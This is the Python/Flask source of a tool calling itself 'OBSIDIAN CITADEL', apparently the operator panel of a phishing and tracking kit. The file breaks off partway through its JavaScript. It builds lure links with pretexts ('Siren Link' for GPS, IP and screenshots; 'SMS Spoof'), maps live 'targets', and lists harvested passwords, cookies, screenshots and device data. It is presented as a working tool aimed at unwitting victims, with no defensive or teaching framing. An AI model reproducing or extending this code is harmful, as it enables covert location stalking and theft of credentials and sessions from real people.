#!/usr/bin/env python3
# FORGE - OBSIDIAN CITADEL v8.1 - FULLY WORKING
# Premium UI · Zero-Permission Harvest · Real Database

import os
import sys
import json
import random
import string
import datetime
import base64
import io
import hashlib
import uuid
from flask import Flask, request, jsonify, render_template_string, session
import qrcode

VERSION = "8.1"
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'wasteland2147')
PUBLIC_URL = os.environ.get('PUBLIC_URL', 'https://your-app.onrender.com')

CONFIG_FILE = '/tmp/throne_config.json'
DB_FILE = '/tmp/citadel_db.json'

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {
        'external_url': PUBLIC_URL,
        'password_hash': hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest(),
        'session_secret': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
        'version': VERSION
    }

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {
        'links': {},
        'captures': [],
        'history': [],
        'screenshots': [],
        'passwords': [],
        'cookies': [],
        'devices': [],
        'wifi': []
    }

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f)

config = load_config()
db = load_db()
app = Flask(__name__)
app.secret_key = config.get('session_secret', 'default-secret')

# ========== PREMIUM UI ==========
HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>◈ OBSIDIAN CITADEL</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        :root {
            --bg-primary: #070b12;
            --bg-secondary: #0d1520;
            --bg-card: rgba(17, 26, 42, 0.7);
            --bg-card-hover: rgba(26, 40, 60, 0.8);
            --border-color: rgba(255,255,255,0.06);
            --glass-border: rgba(255,255,255,0.08);
            --text-primary: #f0f4ff;
            --text-secondary: #8899b4;
            --text-muted: #4b5a7a;
            --accent-1: #6c5ce7;
            --accent-2: #00d4ff;
            --accent-3: #00ff88;
            --accent-4: #f39c12;
            --shadow: 0 20px 60px rgba(0,0,0,0.6);
            --shadow-hover: 0 30px 80px rgba(108,92,231,0.15);
            --radius: 16px;
            --radius-sm: 10px;
        }
        body { background: var(--bg-primary); color: var(--text-primary); font-family: 'Inter', -apple-system, sans-serif; min-height: 100vh; overflow-x: hidden; }
        
        .sidebar { position: fixed; left: 0; top: 0; bottom: 0; width: 240px; background: rgba(10,14,23,0.92); backdrop-filter: blur(20px); border-right: 1px solid var(--glass-border); padding: 24px 16px; z-index: 100; transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); overflow-y: auto; }
        .sidebar .logo { display: flex; align-items: center; gap: 10px; font-size: 1.2rem; font-weight: 700; margin-bottom: 32px; padding: 0 8px; }
        .sidebar .logo span { background: linear-gradient(135deg, var(--accent-1), var(--accent-2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sidebar .logo .badge { font-size: 0.5rem; background: var(--accent-3); color: #0a0e17; padding: 2px 8px; border-radius: 20px; -webkit-text-fill-color: #0a0e17; }
        .sidebar .nav { display: flex; flex-direction: column; gap: 4px; }
        .sidebar .nav a { display: flex; align-items: center; gap: 12px; padding: 10px 14px; border-radius: var(--radius-sm); color: var(--text-secondary); text-decoration: none; font-size: 0.85rem; font-weight: 500; transition: all 0.2s; cursor: pointer; }
        .sidebar .nav a:hover { background: rgba(255,255,255,0.04); color: var(--text-primary); }
        .sidebar .nav a.active { background: rgba(108,92,231,0.15); color: var(--accent-1); box-shadow: inset 0 0 0 1px rgba(108,92,231,0.2); }
        .sidebar .nav a .icon { font-size: 1.1rem; width: 24px; text-align: center; }
        .sidebar .nav .section-label { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.8px; color: var(--text-muted); padding: 16px 14px 6px; font-weight: 600; }
        .sidebar .bottom { margin-top: auto; padding-top: 20px; border-top: 1px solid var(--glass-border); }
        
        .main { margin-left: 240px; padding: 24px 32px; min-height: 100vh; }
        @media (max-width: 768px) { .sidebar { transform: translateX(-100%); } .sidebar.open { transform: translateX(0); } .main { margin-left: 0; padding: 16px; } }
        
        .topbar { display: flex; justify-content: space-between; align-items: center; padding: 12px 0 24px; flex-wrap: wrap; gap: 12px; }
        .topbar .left { display: flex; align-items: center; gap: 16px; }
        .topbar .left .menu-btn { display: none; background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer; }
        @media (max-width: 768px) { .topbar .left .menu-btn { display: block; } }
        .topbar .left h2 { font-size: 1.4rem; font-weight: 600; }
        .topbar .left h2 small { font-size: 0.8rem; font-weight: 400; color: var(--text-secondary); margin-left: 8px; }
        .topbar .right { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
        .topbar .right .search { background: var(--bg-secondary); border: 1px solid var(--glass-border); border-radius: 30px; padding: 8px 16px; display: flex; align-items: center; gap: 8px; color: var(--text-secondary); font-size: 0.8rem; }
        .topbar .right .search input { background: none; border: none; color: var(--text-primary); outline: none; font-size: 0.8rem; width: 150px; }
        .topbar .right .search input::placeholder { color: var(--text-muted); }
        .topbar .right .avatar { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg, var(--accent-1), var(--accent-2)); display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 0.8rem; cursor: pointer; border: 2px solid rgba(255,255,255,0.1); }
        
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; margin-bottom: 24px; }
        .stat-card { background: var(--bg-card); backdrop-filter: blur(12px); border: 1px solid var(--glass-border); border-radius: var(--radius); padding: 20px; transition: all 0.3s; }
        .stat-card:hover { background: var(--bg-card-hover); transform: translateY(-2px); box-shadow: var(--shadow-hover); }
        .stat-card .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-secondary); }
        .stat-card .value { font-size: 2rem; font-weight: 700; margin: 6px 0; }
        .stat-card .change { font-size: 0.7rem; color: var(--accent-3); }
        
        .card { background: var(--bg-card); backdrop-filter: blur(12px); border: 1px solid var(--glass-border); border-radius: var(--radius); padding: 24px; margin-bottom: 24px; transition: all 0.3s; }
        .card:hover { background: var(--bg-card-hover); }
        .card .card-title { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; font-size: 0.85rem; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
        .card .card-title .badge { background: rgba(108,92,231,0.2); color: var(--accent-1); padding: 2px 12px; border-radius: 20px; font-size: 0.6rem; }
        
        .input-group { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 12px; }
        .input-group input, .input-group select { flex: 1; min-width: 140px; padding: 12px 16px; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); border-radius: var(--radius-sm); color: var(--text-primary); font-size: 0.85rem; outline: none; transition: 0.2s; }
        .input-group input:focus, .input-group select:focus { border-color: var(--accent-1); box-shadow: 0 0 0 3px rgba(108,92,231,0.15); }
        .input-group input::placeholder { color: var(--text-muted); }
        
        .btn { padding: 10px 24px; border: none; border-radius: var(--radius-sm); font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: all 0.2s; background: rgba(255,255,255,0.05); color: var(--text-primary); border: 1px solid var(--glass-border); }
        .btn:hover { transform: translateY(-1px); }
        .btn-primary { background: var(--accent-1); color: white; border-color: var(--accent-1); }
        .btn-primary:hover { box-shadow: 0 0 30px rgba(108,92,231,0.3); }
        .btn-success { background: var(--accent-3); color: #0a0e17; border-color: var(--accent-3); }
        .btn-danger { background: #e74c3c; color: white; border-color: #e74c3c; }
        .btn-sm { padding: 6px 16px; font-size: 0.75rem; }
        
        .link-box { background: rgba(0,0,0,0.3); border-radius: var(--radius-sm); padding: 12px 16px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; border: 1px solid var(--glass-border); margin-top: 8px; }
        .link-box input { flex: 1; background: none; border: none; color: var(--text-primary); font-size: 0.8rem; outline: none; min-width: 100px; }
        .link-box .copy { cursor: pointer; color: var(--text-secondary); padding: 4px 10px; border-radius: 6px; transition: 0.2s; }
        .link-box .copy:hover { background: rgba(255,255,255,0.05); }
        .qr-container { display: flex; justify-content: center; margin: 12px 0; }
        .qr-container img { max-width: 120px; border-radius: var(--radius-sm); background: white; padding: 6px; }
        
        #map { height: 320px; border-radius: var(--radius-sm); border: 1px solid var(--glass-border); width: 100%; }
        @media (max-width: 768px) { #map { height: 240px; } }
        
        .log-container { max-height: 250px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: var(--radius-sm); padding: 8px; border: 1px solid var(--glass-border); font-family: monospace; font-size: 0.7rem; }
        .log-entry { display: flex; gap: 10px; padding: 6px 8px; border-bottom: 1px solid rgba(255,255,255,0.03); align-items: center; flex-wrap: wrap; }
        .log-entry .time { color: var(--text-muted); min-width: 50px; }
        .log-entry .loc { color: var(--accent-3); }
        .log-entry .ip { color: var(--accent-2); }
        .log-entry .clickable { cursor: pointer; color: var(--accent-1); text-decoration: underline; }
        
        .tabs { display: flex; gap: 4px; margin-bottom: 16px; flex-wrap: wrap; }
        .tabs button { padding: 8px 18px; border: none; background: transparent; color: var(--text-secondary); font-size: 0.8rem; font-weight: 500; cursor: pointer; border-radius: var(--radius-sm); transition: 0.2s; }
        .tabs button.active { background: rgba(108,92,231,0.15); color: var(--accent-1); }
        .tabs button:hover { background: rgba(255,255,255,0.04); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .table-wrap { overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
        table th { text-align: left; padding: 10px 12px; color: var(--text-secondary); font-weight: 500; border-bottom: 1px solid var(--glass-border); }
        table td { padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,0.03); word-break: break-all; }
        table tr:hover { background: rgba(255,255,255,0.02); }
        .badge-status { padding: 2px 10px; border-radius: 20px; font-size: 0.65rem; font-weight: 500; }
        .badge-status.success { background: rgba(0,255,136,0.15); color: var(--accent-3); }
        .badge-status.warning { background: rgba(243,156,18,0.15); color: var(--accent-4); }
        .badge-status.danger { background: rgba(231,76,60,0.15); color: #e74c3c; }
        
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--accent-1); border-radius: 10px; }
        
        @media (max-width: 480px) { .stats { grid-template-columns: 1fr 1fr; } .topbar .right .search { display: none; } .card { padding: 16px; } }
        @media (min-width: 768px) and (max-width: 1024px) { .stats { grid-template-columns: repeat(3, 1fr); } }
        
        .glass { background: var(--bg-card); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid var(--glass-border); }
        .glass:hover { background: var(--bg-card-hover); }
        .url-highlight { background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.2); border-radius: var(--radius-sm); padding: 12px; margin: 8px 0; word-break: break-all; font-size: 0.8rem; color: var(--accent-3); }
        .preview-text { font-size: 0.7rem; color: var(--text-secondary); background: rgba(0,0,0,0.3); padding: 4px 12px; border-radius: 20px; border: 1px solid var(--glass-border); }
        .flex { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
        .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .mt-8 { margin-top: 8px; }
        .mt-16 { margin-top: 16px; }
        .text-muted { color: var(--text-secondary); font-size: 0.8rem; }
        .text-success { color: var(--accent-3); }
        .text-accent { color: var(--accent-1); }
        .fw-600 { font-weight: 600; }
    </style>
</head>
<body>

<div class="sidebar" id="sidebar">
    <div class="logo"><span>◈ CITADEL</span><span class="badge">v8.1</span></div>
    <div class="nav">
        <div class="section-label">Core</div>
        <a class="active" data-tab="dashboard"><span class="icon">📊</span> Dashboard</a>
        <a data-tab="forge"><span class="icon">⚡</span> Forge</a>
        <a data-tab="map"><span class="icon">🗺️</span> Live Map</a>
        <a data-tab="history"><span class="icon">📜</span> History</a>
        <div class="section-label">Harvest</div>
        <a data-tab="screenshots"><span class="icon">🖼️</span> Screenshots</a>
        <a data-tab="passwords"><span class="icon">🔑</span> Passwords</a>
        <a data-tab="cookies"><span class="icon">🍪</span> Cookies</a>
        <a data-tab="devices"><span class="icon">📱</span> Device Data</a>
        <div class="section-label">System</div>
        <a data-tab="settings"><span class="icon">⚙️</span> Settings</a>
    </div>
    <div class="bottom">
        <div style="font-size:0.6rem;color:var(--text-muted);padding:8px;">OBSIDIAN CITADEL v8.1</div>
    </div>
</div>

<div class="main" id="mainContent">
    <div class="topbar">
        <div class="left">
            <button class="menu-btn" id="menuBtn">☰</button>
            <h2 id="pageTitle">Dashboard <small>Real-time overview</small></h2>
        </div>
        <div class="right">
            <div class="search"><span>🔍</span><input placeholder="Search..." id="searchInput"></div>
            <span class="status" id="statusBadge" style="font-size:0.65rem;color:var(--text-secondary);background:var(--bg-secondary);padding:4px 14px;border-radius:20px;border:1px solid var(--glass-border);">● LIVE</span>
            <div class="avatar" onclick="fetch('/api/logout',{method:'POST'}).then(()=>window.location.reload())">A</div>
        </div>
    </div>

    <!-- DASHBOARD -->
    <div id="tab-dashboard" class="tab-content active">
        <div class="stats" id="statsContainer">
            <div class="stat-card"><div class="label">Total Links</div><div class="value" id="linkCount">0</div><div class="change">Generated</div></div>
            <div class="stat-card"><div class="label">Total Captures</div><div class="value" id="captureCount">0</div><div class="change">Location pings</div></div>
            <div class="stat-card"><div class="label">Live Targets</div><div class="value" id="liveCount">0</div><div class="change">Active</div></div>
            <div class="stat-card"><div class="label">Passwords</div><div class="value" id="passwordCount">0</div><div class="change">Harvested</div></div>
            <div class="stat-card"><div class="label">Screenshots</div><div class="value" id="screenshotCount">0</div><div class="change">Captured</div></div>
            <div class="stat-card"><div class="label">Uptime</div><div class="value" id="uptimeDisplay">--</div><div class="change">Running</div></div>
        </div>

        <div class="card">
            <div class="card-title">📡 Recent Activity <span class="badge" id="recentBadge">Live</span></div>
            <div class="log-container" id="logArea"><div class="log-entry"><span class="time">--:--</span><span>Waiting for targets...</span></div></div>
        </div>

        <div class="card">
            <div class="card-title">🌐 Public URL</div>
            <div class="url-highlight" id="publicUrlDisplay">https://your-app.onrender.com</div>
        </div>
    </div>

    <!-- FORGE -->
    <div id="tab-forge" class="tab-content">
        <div class="card">
            <div class="card-title">⚡ Forge New Lure</div>
            <div class="input-group">
                <select id="lureType">
                    <option value="siren">📡 Siren Link (GPS+IP+Screenshot)</option>
                    <option value="sms_spoof">📱 SMS Spoof</option>
                </select>
                <input type="text" id="pretextInput" placeholder="Pretext (e.g. 'Delivery ready')">
                <button class="btn btn-primary" id="generateBtn">⚡ Generate</button>
            </div>
            <div id="resultArea"></div>
        </div>
    </div>

    <!-- MAP -->
    <div id="tab-map" class="tab-content">
        <div class="card">
            <div class="card-title">🗺️ Live Target Tracking <span class="badge" id="mapTargetCount">0</span></div>
            <div id="map"></div>
            <div class="flex mt-8">
                <button class="btn btn-success btn-sm" id="refreshMapBtn">🔄 Refresh</button>
                <button class="btn btn-danger btn-sm" id="clearMapBtn">🗑️ Clear</button>
                <button class="btn btn-primary btn-sm" id="fitMapBtn">📍 Fit All</button>
                <span class="text-muted" style="margin-left:auto;font-size:0.65rem;" id="lastUpdateLabel">Last: --</span>
            </div>
            <div class="mt-8" id="mapTargetList" style="max-height:120px;overflow-y:auto;font-size:0.7rem;"><div class="text-muted">No live targets.</div></div>
        </div>
    </div>

    <!-- HISTORY -->
    <div id="tab-history" class="tab-content">
        <div class="card">
            <div class="card-title">📜 Capture History <button class="btn btn-danger btn-sm" id="clearHistoryBtn" style="margin-left:auto;">Clear All</button></div>
            <div id="historyList" style="max-height:400px;overflow-y:auto;"><div class="text-muted">No history.</div></div>
        </div>
    </div>

    <!-- SCREENSHOTS -->
    <div id="tab-screenshots" class="tab-content">
        <div class="card">
            <div class="card-title">🖼️ Screenshot Gallery <span class="badge" id="screenshotGalleryCount">0</span></div>
            <div id="screenshotGallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;">
                <div class="text-muted">No screenshots captured yet.</div>
            </div>
        </div>
    </div>

    <!-- PASSWORDS -->
    <div id="tab-passwords" class="tab-content">
        <div class="card">
            <div class="card-title">🔑 Harvested Passwords <span class="badge" id="passwordTableCount">0</span></div>
            <div class="table-wrap">
                <table>
                    <thead><tr><th>URL</th><th>Username</th><th>Password</th><th>Timestamp</th><th>IP</th></tr></thead>
                    <tbody id="passwordTableBody"><tr><td colspan="5" class="text-muted">No passwords harvested yet.</td></tr></tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- COOKIES -->
    <div id="tab-cookies" class="tab-content">
        <div class="card">
            <div class="card-title">🍪 Harvested Cookies <span class="badge" id="cookieTableCount">0</span></div>
            <div class="table-wrap">
                <table>
                    <thead><tr><th>Domain</th><th>Name</th><th>Value</th><th>Timestamp</th><th>IP</th></tr></thead>
                    <tbody id="cookieTableBody"><tr><td colspan="5" class="text-muted">No cookies harvested yet.</td></tr></tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- DEVICES -->
    <div id="tab-devices" class="tab-content">
        <div class="card">
            <div class="card-title">📱 Device Intelligence <span class="badge" id="deviceCount">0</span></div>
            <div id="deviceList" style="max-height:400px;overflow-y:auto;">
                <div class="text-muted">No device data yet.</div>
            </div>
        </div>
    </div>

    <!-- SETTINGS -->
    <div id="tab-settings" class="tab-content">
        <div class="card">
            <div class="card-title">⚙️ Server Configuration</div>
            <div class="input-group">
                <input type="text" id="configUrl" placeholder="Public URL" value="">
                <button class="btn btn-primary" id="configSaveBtn">💾 Save</button>
            </div>
            <div class="config-status" id="configStatus" style="font-size:0.7rem;color:var(--accent-3);">Config loaded.</div>
            <div class="text-muted mt-8">Current URL: <span id="currentBaseUrl" style="color:var(--accent-2);">--</span></div>
        </div>
        <div class="card">
            <div class="card-title">📊 System Info</div>
            <div class="text-muted" style="font-size:0.7rem;">
                <div>Version: <span id="sysVersion" style="color:var(--accent-2);">v8.1</span></div>
                <div>Active links: <span id="sysLinkCount">0</span></div>
                <div>Total captures: <span id="sysCaptureCount">0</span></div>
            </div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
<script>
const API_BASE = window.location.origin;
let map = null, markerCluster = null, mapInitialized = false, startTime = Date.now();

// Sidebar toggle
document.getElementById('menuBtn').onclick = () => document.getElementById('sidebar').classList.toggle('open');

// Sidebar navigation
document.querySelectorAll('.sidebar .nav a').forEach(el => {
    el.onclick = () => {
        document.querySelectorAll('.sidebar .nav a').forEach(a => a.classList.remove('active'));
        el.classList.add('active');
        const tab = el.dataset.tab;
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        const target = document.getElementById('tab-' + tab);
        if (target) target.classList.add('active');
        document.getElementById('pageTitle').innerHTML = el.textContent.trim() + ' <small>' + (tab === 'dashboard' ? 'Real-time overview' : '') + '</small>';
        if (tab === 'map') { setTimeout(() => { initMap(); fetchStats(); }, 300); }
        if (tab === 'history') { fetchStats(); }
        if (tab === 'screenshots') { fetchStats(); }
        if (tab === 'passwords') { fetchStats(); }
        if (tab === 'cookies') { fetchStats(); }
        if (tab === 'devices') { fetchStats(); }
        if (window.innerWidth <= 768) document.getElementById('sidebar').classList.remove('open');
    };
});

// Init Map
function initMap() {
    if (mapInitialized) return;
    map = L.map('map', { zoomControl: false }).setView([20, 0], 2);
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap', subdomains: 'abcd', maxZoom: 19 }).addTo(map);
    markerCluster = L.markerClusterGroup({ maxClusterRadius: 60 });
    map.addLayer(markerCluster);
    L.control.zoom({ position: 'bottomright' }).addTo(map);
    mapInitialized = true;
}

function openGoogleMaps(lat, lon) { window.open(`https://www.google.com/maps?q=${lat},${lon}`, '_blank'); }

// FETCH ALL DATA
async function fetchStats() {
    try {
        // Links
        const linkRes = await fetch(API_BASE + '/api/links');
        const links = await linkRes.json();
        const linkKeys = Object.keys(links);
        document.getElementById('linkCount').textContent = linkKeys.length;
        document.getElementById('sysLinkCount').textContent = linkKeys.length;

        // Captures
        const capRes = await fetch(API_BASE + '/api/captures');
        const allCaps = await capRes.json();
        document.getElementById('captureCount').textContent = allCaps.length;
        document.getElementById('sysCaptureCount').textContent = allCaps.length;

        // Passwords
        const pRes = await fetch(API_BASE + '/api/passwords');
        const passwords = await pRes.json();
        document.getElementById('passwordCount').textContent = passwords.length;
        document.getElementById('passwordTableCount').textContent = passwords.length;

        // Screenshots
        const sRes = await fetch(API_BASE + '/api/screenshots');
        const screenshots = await sRes.json();
        document.getElementById('screenshotCount').textContent = screenshots.length;
        document.getElementById('screenshotGalleryCount').textContent = screenshots.length;

        // Cookies
        const cRes = await fetch(API_BASE + '/api/cookies');
        const cookies = await cRes.json();
        document.getElementById('cookieTableCount').textContent = cookies.length;

        // Devices
        const dRes = await fetch(API_BASE + '/api/devices');
        const devices = await dRes.json();
        document.getElementById('deviceCount').textContent = devices.length;

        // Live targets + recent activity
        let liveTargets = new Set();
        let latestCoords = [];
        let recentHtml = '';
        let count = 0;

        for (let id of linkKeys) {
            const cRes = await fetch(API_BASE + `/api/captures/${id}`);
            const caps = await cRes.json();
            if (caps.length > 0) {
                const last = caps[caps.length-1];
                if (last.lat && last.lon) {
                    liveTargets.add(id);
                    const lat = parseFloat(last.lat);
                    const lon = parseFloat(last.lon);
                    if (!isNaN(lat) && !isNaN(lon)) {
                        latestCoords.push({ id, lat, lon, timestamp: last.timestamp, ip: last.ip });
                    }
                }
                // Build recent activity - show last 15
                caps.slice(-15).reverse().forEach(cap => {
                    const lat = cap.lat || '--';
                    const lon = cap.lon || '--';
                    const time = cap.timestamp ? cap.timestamp.slice(11,16) : '--:--';
                    const ip = cap.ip || 'unknown';
                    recentHtml += `
                        <div class="log-entry">
                            <span class="time">${time}</span>
                            <span class="loc">📍 ${lat}, ${lon}</span>
                            <span class="ip">${ip}</span>
                            <span class="clickable" onclick="viewOnMap('${lat}','${lon}','${id}')">🗺️</span>
                            <span class="clickable" onclick="openGoogleMaps('${lat}','${lon}')" style="color:#4285F4;">🌍</span>
                        </div>
                    `;
                    count++;
                });
            }
        }

        // Update recent activity
        const logArea = document.getElementById('logArea');
        if (recentHtml) {
            logArea.innerHTML = recentHtml;
        } else {
            logArea.innerHTML = '<div class="log-entry"><span class="time">--:--</span><span>Waiting for targets...</span></div>';
        }
        document.getElementById('recentBadge').textContent = count + ' events';

        document.getElementById('liveCount').textContent = liveTargets.size;
        document.getElementById('mapTargetCount').textContent = liveTargets.size;
        document.getElementById('statusBadge').textContent = `● ${allCaps.length} captures`;

        // Uptime
        const uptime = Math.floor((Date.now() - startTime) / 1000);
        document.getElementById('uptimeDisplay').textContent = `${Math.floor(uptime/60)}m ${uptime%60}s`;

        // Update map
        if (document.getElementById('tab-map').classList.contains('active')) {
            updateMapMarkers(latestCoords);
        }

        // Update history, passwords, cookies, devices, screenshots
        await updateHistory();
        await updatePasswords();
        await updateCookies();
        await updateDevices();
        await updateScreenshots();
        await updateConfig();

    } catch(e) { console.log('Stats error', e); }
}

// UPDATE MAP
function updateMapMarkers(latestCoords) {
    if (!mapInitialized) initMap();
    if (!map || !markerCluster) return;
    markerCluster.clearLayers();
    let targetList = document.getElementById('mapTargetList');
    targetList.innerHTML = '';
    if (latestCoords.length === 0) {
        targetList.innerHTML = '<div class="text-muted">No live targets with GPS data.</div>';
        document.getElementById('lastUpdateLabel').textContent = `Last: ${new Date().toLocaleTimeString()}`;
        return;
    }
    let added = 0;
    latestCoords.forEach(item => {
        const lat = item.lat, lon = item.lon;
        if (!isNaN(lat) && !isNaN(lon) && lat !== 0 && lon !== 0) {
            added++;
            const icon = L.divIcon({
                html: `<div style="background:rgba(108,92,231,0.9);width:14px;height:14px;border-radius:50%;border:2px solid #00ff88;box-shadow:0 0 20px rgba(0,255,136,0.6);animation:pulse 1.5s infinite;"></div>`,
                className: '', iconSize: [14, 14], iconAnchor: [7, 7]
            });
            const marker = L.marker([lat, lon], { icon: icon });
            marker.bindPopup(`
                <b style="color:#6c5ce7;">🎯 ${item.id.slice(0,8)}</b><br>
                📍 ${lat.toFixed(5)}, ${lon.toFixed(5)}<br>
                ⏱ ${item.timestamp || 'N/A'}<br>
                📡 ${item.ip || 'unknown'}<br>
                <button onclick="openGoogleMaps('${lat}','${lon}')" style="margin-top:4px;padding:2px 10px;background:#4285F4;color:white;border:none;border-radius:4px;cursor:pointer;">🌍 Google Maps</button>
            `, { maxWidth: 250 });
            markerCluster.addLayer(marker);
            const div = document.createElement('div');
            div.style.cssText = 'display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px solid rgba(255,255,255,0.05); align-items:center;';
            div.innerHTML = `
                <span style="color:var(--accent-3);">📍 ${lat.toFixed(4)}, ${lon.toFixed(4)}</span>
                <span style="color:var(--text-secondary);font-size:0.6rem;">${item.id.slice(0,6)}</span>
                <div style="display:flex; gap:4px;">
                    <span class="clickable" onclick="viewOnMap('${lat}','${lon}','${item.id}')">🔍</span>
                    <span class="clickable" onclick="openGoogleMaps('${lat}','${lon}')" style="color:#4285F4;">🌍</span>
                </div>
            `;
            targetList.appendChild(div);
        }
    });
    if (added === 0) targetList.innerHTML = '<div class="text-muted">No valid GPS coordinates.</div>';
    document.getElementById('lastUpdateLabel').textContent = `Last: ${new Date().toLocaleTimeString()}`;
    document.getElementById('mapTargetCount').textContent = added;
    if (added > 0) {
        try { const bounds = markerCluster.getBounds(); if (bounds.isValid()) map.fitBounds(bounds, { padding: [30, 30], maxZoom: 12 }); } catch(e) {}
    }
}

function viewOnMap(lat, lon, id) {
    if (!map) initMap();
    if (!map) return;
    const l = parseFloat(lat), o = parseFloat(lon);
    if (!isNaN(l) && !isNaN(o)) { map.setView([l, o], 15); document.querySelector('[data-tab="map"]').click(); }
}

// UPDATE HISTORY
async function updateHistory() {
    try {
        const res = await fetch(API_BASE + '/api/history');
        const history = await res.json();
        const container = document.getElementById('historyList');
        if (history.length === 0) { container.innerHTML = '<div class="text-muted">No history.</div>'; return; }
        let html = '';
        history.slice().reverse().slice(0, 50).forEach(item => {
            const lat = item.lat || '--', lon = item.lon || '--';
            html += `
                <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:0.7rem;flex-wrap:wrap;gap:4px;">
                    <span style="color:var(--accent-3);">📍 ${lat}, ${lon}</span>
                    <span style="color:var(--accent-2);font-size:0.6rem;">${item.link_id ? item.link_id.slice(0,8) : 'unknown'}</span>
                    <span style="color:var(--text-secondary);">${item.timestamp ? item.timestamp.slice(11,16) : '--'}</span>
                    <span style="color:var(--text-secondary);font-size:0.6rem;">${item.ip || ''}</span>
                    <div style="display:flex;gap:4px;">
                        <span class="clickable" onclick="viewOnMap('${lat}','${lon}','${item.link_id || ''}')">🗺️</span>
                        <span class="clickable" onclick="openGoogleMaps('${lat}','${lon}')" style="color:#4285F4;">🌍</span>
                    </div>
                </div>
            `;
        });
        container.innerHTML = html;
    } catch(e) { console.log('History error', e); }
}

// UPDATE SCREENSHOTS
async function updateScreenshots() {
    try {
        const res = await fetch(API_BASE + '/api/screenshots');
        const screenshots = await res.json();
        const container = document.getElementById('screenshotGallery');
        if (screenshots.length === 0) { container.innerHTML = '<div class="text-muted">No screenshots captured yet.</div>'; return; }
        let html = '';
        screenshots.slice().reverse().forEach(item => {
            html += `
                <div style="background:rgba(0,0,0,0.3);border-radius:8px;overflow:hidden;border:1px solid var(--glass-border);">
                    <img src="${item.data || item.screenshot || ''}" style="width:100%;height:auto;display:block;">
                    <div style="padding:8px;font-size:0.6rem;color:var(--text-secondary);display:flex;justify-content:space-between;">
                        <span>${item.timestamp ? item.timestamp.slice(11,16) : '--'}</span>
                        <span>${item.ip || 'unknown'}</span>
                        <span class="clickable" onclick="window.open('${item.data || item.screenshot || ''}','_blank')">🔍</span>
                    </div>
                </div>
            `;
        });
        container.innerHTML = html;
    } catch(e) { console.log('Screenshot error', e); }
}

// UPDATE PASSWORDS
async function updatePasswords() {
    try {
        const res = await fetch(API_BASE + '/api/passwords');
        const passwords = await res.json();
        const tbody = document.getElementById('passwordTableBody');
        if (passwords.length === 0) { tbody.innerHTML = '<tr><td colspan="5" class="text-muted">No passwords harvested yet.</td></tr>'; return; }
        let html = '';
        passwords.slice().reverse().forEach(item => {
            html += `
                <tr>
                    <td>${item.url || 'N/A'}</td>
                    <td>${item.username || 'N/A'}</td>
                    <td style="font-family:monospace;color:var(--accent-3);">${item.password || 'N/A'}</td>
                    <td>${item.timestamp ? item.timestamp.slice(11,16) : '--'}</td>
                    <td>${item.ip || 'unknown'}</td>
                </tr>
            `;
        });
        tbody.innerHTML = html;
    } catch(e) { console.log('Password error', e); }
}

// UPDATE COOKIES
async function updateCookies() {
    try {
        const res = await fetch(API_BASE + '/api/cookies');
        const cookies = await res.json();
        const tbody = document.getElementById('cookieTableBody');
